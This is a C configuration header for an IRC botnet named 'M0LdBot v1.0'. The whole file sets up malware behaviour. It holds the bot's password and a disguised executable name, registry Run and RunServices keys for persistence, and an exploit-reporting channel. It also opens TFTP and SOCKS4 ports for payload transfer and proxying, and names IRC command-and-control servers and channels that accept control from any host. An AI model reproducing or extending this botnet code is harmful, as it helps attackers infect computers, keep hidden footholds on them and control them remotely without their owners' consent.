#pragma pack(1)
//Bot configuration

char password[] = "p";
char filename[] = "windvs.exe";
char valuename[] = "dick";
char prefix = '!';
const int maxaliases = 16;
const int maxlogins = 3;
char nickconst[] = "PnP[]";
char version[] = "[M0LdBot v1.0 Test Release]";
char botid[] = "mbtr";
int maxrand = 8;
int nicktype = CONSTNICK;
int tftpport = 69;
int socks4port = 1026;
int cryptkey = 0;
BOOL rndfilename = FALSE;
BOOL topiccmd = TRUE;
BOOL regrun = TRUE;
BOOL nickprefix = TRUE;
char *authost[] = {"*@*", "\0"};

//server #1
char server[] = "";
char serverpass[] = "";
char exploitchan[] = "#a";
int port = 3;
char channel[] = "#a";
char chanpass[] = "";

//server #2
char server2[] = "server2";
int port2 = 6667;
char channel2[] = "#m0d";
char chanpass2[] = "inter";

//reg keys
char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";